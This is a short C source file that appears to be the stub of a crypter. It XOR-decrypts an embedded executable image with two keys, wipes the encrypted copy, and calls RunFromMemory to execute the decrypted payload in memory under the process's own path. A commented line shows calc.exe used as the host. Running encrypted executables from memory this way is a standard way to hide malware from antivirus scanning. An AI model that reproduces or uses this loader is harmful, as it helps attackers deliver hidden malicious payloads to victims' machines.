#include <windows.h>
#include <stdio.h>

#include "main.h"
#include "pe_image.h"

int main(){
    int i, x;
    char exec_file_path[1024];
    unsigned char decrypted_bytes[array_len+1] = {};

    for (i = 0; i < array_len; i++) {
      decrypted_bytes[i] = key_two ^ image_crypt[i];
      image_crypt[i] = '\0';
    }

    for (i = 0; i < array_len; i++) {
      decrypted_bytes[i] = key_one ^ decrypted_bytes[i];
    }

    GetModuleFileNameA(0, exec_file_path, 1024);
    RunFromMemory((char*)decrypted_bytes, exec_file_path);
    //RunFromMemory((char*)decrypted_bytes, (char*)"c:\\windows\\system32\\calc.exe");
    return 0;
}
